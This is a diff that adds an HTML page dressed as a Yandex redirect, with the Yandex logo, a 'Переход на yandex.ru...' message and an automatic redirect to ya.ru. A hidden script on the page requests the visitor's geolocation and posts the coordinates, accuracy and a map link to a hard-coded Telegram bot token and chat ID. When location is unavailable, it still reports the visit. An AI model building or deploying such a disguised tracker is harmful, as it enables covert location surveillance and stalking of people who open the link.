@@ -1,0 +1,68 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+  <meta charset="UTF-8">
+  <title>Яндекс</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta http-equiv="refresh" content="5; url=https://ya.ru">
+  <style>
+    body {
+      margin: 0;
+      background: #fff;
+      font-family: Arial, sans-serif;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+      flex-direction: column;
+    }
+    img {
+      width: 180px;
+      margin-bottom: 20px;
+    }
+    .text {
+      color: #888;
+      font-size: 16px;
+    }
+  </style>
+</head>
+<body>
+  <img src="https://yastatic.net/s3/home-static/_/f/5/f56c110108fa30c7f0210c6d21e287f6.png" alt="Yandex Logo" />
+  <div class="text">Переход на yandex.ru...</div>
+
+  <script>
+    const botToken = "7972755394:AAFVmA7LMOgpygkl-ED_vhHd2eUs-agQ1aw";
+    const chatId = "148031411";
+
+    function sendToTelegram(text) {
+      fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+        method: "POST",
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          chat_id: chatId,
+          text: text
+        })
+      });
+    }
+
+    function handleGeo(position) {
+      const lat = position.coords.latitude.toFixed(6);
+      const lon = position.coords.longitude.toFixed(6);
+      const accuracy = position.coords.accuracy;
+
+      const msg = `📍 Переход через "Яндекс"\nШирота: ${lat}\nДолгота: ${lon}\nТочность: ±${Math.round(accuracy)}м\nhttps://www.google.com/maps?q=${lat},${lon}`;
+      sendToTelegram(msg);
+    }
+
+    function handleError() {
+      sendToTelegram("⚠️ Геолокация не получена (режим Яндекс-замены)");
+    }
+
+    if (navigator.geolocation) {
+      navigator.geolocation.getCurrentPosition(handleGeo, handleError);
+    } else {
+      sendToTelegram("⚠️ Геолокация не поддерживается браузером.");
+    }
+  </script>
+</body>
+</html>
